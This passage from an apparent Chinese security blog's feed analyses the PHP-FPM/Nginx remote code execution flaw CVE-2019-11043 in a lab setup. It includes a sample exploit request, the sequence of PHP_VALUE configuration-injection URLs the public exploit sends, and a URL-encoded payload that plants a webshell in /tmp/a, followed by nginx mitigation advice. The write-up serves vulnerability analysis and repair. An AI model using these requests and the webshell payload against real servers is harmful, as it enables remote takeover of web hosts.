class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_INFO       <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  REDIRECT_STATUS    <span class="number">200</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME /var/www/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl -l start nginx</span><br><span class="line">vim /usr/share/nginx/html/index.php &amp;&amp; vim /var/www/html/index.php</span><br></pre></td></tr></table></figure><p>-&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试nginx是否可用</span></span><br><span class="line">curl http://127.0.0.1/index.php</span><br></pre></td></tr></table></figure><br/><h1 id="Vulnerability-Emersion"><a href="#Vulnerability-Emersion" class="headerlink" title="Vulnerability Emersion"></a>Vulnerability Emersion</h1><p><strong>根据网络安全威胁信息发布管理办法(征求意见稿)-第四条(三)，该部分不提供能够完整复现该CVE的细节，仅展示效果，望周知。</strong></p><ul><li>使用<code>go run . &quot;http://{your-ip}:8080/index.php&quot;</code>后我们可以通过访问<code>http://{your-ip}:8080/index.php?a={cmd}</code>执行任意命令:<br><img src="exp-result.png" alt="pic"></li></ul><blockquote><p>使用vulhub部署环境的，访问两次中只有一次可以执行命令，原因是该docker采用默认的php-fpm配置，<code>pm=dynamic</code>&amp;<code>pm.start_servers=2</code>，两次访问中只有一次是被已污染的pool处理: (原因具体详见<a href="https://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/#Afterword">我的另一篇分析文章</a>)</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> docker top xxx</span></span><br><span class="line">PID                 USER                TIME                COMMAND</span><br><span class="line">3576                root                0:00                php-fpm: master process (/usr/local/etc/php-fpm.conf)</span><br><span class="line">3711                xfs                 0:00                php-fpm: pool www</span><br><span class="line">3928                xfs                 0:00                php-fpm: pool www</span><br></pre></td></tr></table></figure><br/><h1 id="Exp-Analysis"><a href="#Exp-Analysis" class="headerlink" title="Exp Analysis"></a>Exp Analysis</h1><p>主要分析EXP默认参数的核心利用部分代码，<strong>附加参数、完整细节不讨论</strong>，有兴趣的读者自行分析源码，有问题通过微博/邮箱与我交流。<br>参考请求包如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php&#x2F;path%0Ainfo.php?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP&#x2F;1.1</span><br><span class="line">Host: &#123;your-ip&#125;</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0</span><br><span class="line">D-Pisos: 8&#x3D;D</span><br><span class="line">Ebut: mamku tvoyu</span><br></pre></td></tr></table></figure><h2 id="Methods-method"><a href="#Methods-method" class="headerlink" title="Methods[method]"></a>Methods[method]</h2><p>设置exp的探测方法，默认采用<code>session.auto_start</code>，它作为<code>php.ini</code>配置时会在响应头<code>set-cookie</code>自动带上<code>PHPSESSID</code>。</p><h2 id="NewRequester-url-cookie-delay"><a href="#NewRequester-url-cookie-delay" class="headerlink" title="NewRequester(url, cookie, delay)"></a>NewRequester(url, cookie, delay)</h2><p>解析url，并创建Requester供detect/attach作为包模版。</p><h2 id="Detect-requester-m-params-onlyQSL"><a href="#Detect-requester-m-params-onlyQSL" class="headerlink" title="Detect(requester, m, params, onlyQSL)"></a>Detect(requester, m, params, onlyQSL)</h2><p>核心之一，用于确定<code>base-status-code</code> / <code>Q</code>填充个数/ <code>8=D</code>中等号个数..</p><ul><li>首先url带上<code>/path\ninfo.php</code>，检测被0a截断时的status-code为多少，用于作为<code>base-status-code</code>。同上的参考请求包。</li><li>循环增加URL中<code>Q</code>个数(MinQSL(1500)-&gt;MaxQSL(1950))，直至服务器返回502，说明<code>path-&gt;info</code>指向了敏感堆（详见<a href="https://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/#Control-configuration">漏洞分析</a>），导致崩溃，将该URL长度加入候选。最后将每个候选值-5/-10同样加入候选。</li><li>通过<code>SanityCheck()</code>检测相关问题。</li><li>通过<code>MakePathInfo(method.PHPOptionEnable)</code>设置URL使用<code>/PHP_VALUE%0Asession.auto_start=1</code>，与<code>PosOffset</code>即34的长度差距用<code>;</code>补齐，让URL总长度保持固定。</li><li>针对每个候选值，依旧循环增加URL中<code>Q</code>个数(MinQSL(1500)-&gt;MaxQSL(1950))，根据响应头中有无<code>PHPSESSID</code>判断是否利用成功，利用成功后确定<code>Q</code>和<code>=</code>个数，即<code>qsl</code>和<code>pl</code>值。</li><li>通过<code>SetSetting</code>将<code>session.auto_start</code>置回0。</li></ul><h2 id="Attack-requester-params"><a href="#Attack-requester-params" class="headerlink" title="Attack(requester, params)"></a>Attack(requester, params)</h2><p>接下来展开利用，依次写入如下配置：</p><blockquote><ol><li>/index.php/PHP_VALUE%0Ashort_open_tag=1;;;;;;;</li><li>/index.php/PHP_VALUE%0Ahtml_errors=0;;;;;;;;;;</li><li>/index.php/PHP_VALUE%0Ainclude_path=/tmp;;;;;;</li><li>/index.php/PHP_VALUE%0Aauto_prepend_file=a;;;;</li><li>/index.php/PHP_VALUE%0Alog_errors=1;;;;;;;;;;;</li><li>/index.php/PHP_VALUE%0Aerror_reporting=2;;;;;;</li><li>/index.php/PHP_VALUE%0Aerror_log=/tmp/a;;;;;;;</li><li>/index.php/PHP_VALUE%0Aextension_dir=%22%3C%3F=%60%22;;;</li><li>/index.php/PHP_VALUE%0Aextension=%22$_GET%5Ba%5D%60%3F%3E%22</li></ol></blockquote><p>最后，通过RCE写文件进<code>/tmp/a</code>，服务器获取资源时会自动载入，相当于对所有php页面加了马：<code>a=%3Becho+%27%3C%3Fphp+echo+%60%24_GET%5Ba%5D%60%3Breturn%3B%3F%3E%27%3E%2Ftmp%2Fa%3Bwhich+which</code><br><br/></p><h1 id="Influence-Surface-amp-Repair"><a href="#Influence-Surface-amp-Repair" class="headerlink" title="Influence Surface &amp; Repair"></a>Influence Surface &amp; Repair</h1><p>若Nginx配置了<code>fastcgi_split_path_info ^(.+?\.php)(/.*)$;</code>，那么会允许<code>.php</code>后添加任意内容，并转发给php-fpm处理。<br>那么根本上，修复有两种方法，一种是直接更新php-fpm，第二种是将不合时宜的URL直接404，比如参照<a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="noopener">官方文档</a>添加判断：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line"><span class="attribute">if</span> (!-f <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>) &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或直接：<code>try_files $uri =404</code></p><p>随着不当的Nginx配置在网络流传，导致本不该出现的问题也会在众多服务器中存在。RCE决定了该漏洞存在get-shell、提权、持续控制等更加影响深远的问题，值得服务器维护者的关注。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043" target="_blank" rel="noopener">vulhub/php/CVE-2019-11043</a></li><li><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">neex/phuip-fpizdam</a></li><li><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">CVE details</a></li><li><a href="https://lorexxar.cn/2019/10/25/php-fpm-rce/" target="_blank" rel="noopener">土土’s blog</a></li><li><a href="https://gingsguard.github.io/Nginx-PHP-FPM%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-EXP%E5%88%86%E6%9E%90/#Q%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6%E5%80%99%E9%80%89%E5%80%BC%E7%A1%AE%E8%AE%A4%E9%98%B6%E6%AE%B5" target="_blank" rel="noopener">gingsguard blog</a></li><li><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="noopener">offical doc</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;The-foregoing&quot;&gt;&lt;a href=&quot;#The-foregoing&quot; class=&quot;headerlink&quot; title=&quot;The foregoing.&quot;&gt;&lt;/a&gt;The foregoing.&lt;/h1&gt;&lt;p&gt;该CVE的来源很有趣，外国安研Andrew Da
      
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://hducaiji.github.io/tags/CVE/"/>
    
      <category term="PHP" scheme="http://hducaiji.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>N/A</title>
    <link href="http://hducaiji.github.io/2019/04/20/top/"/>
    <id>http://hducaiji.github.io/2019/04/20/top/</id>
    <published>2019-04-20T08:00:36.000Z</published>
    <updated>2020-07-28T07:28:50.859Z</updated>
    
    <content type="html"><![CDATA[<p>Just Enjoy, man.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Just Enjoy, man.&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
</feed>
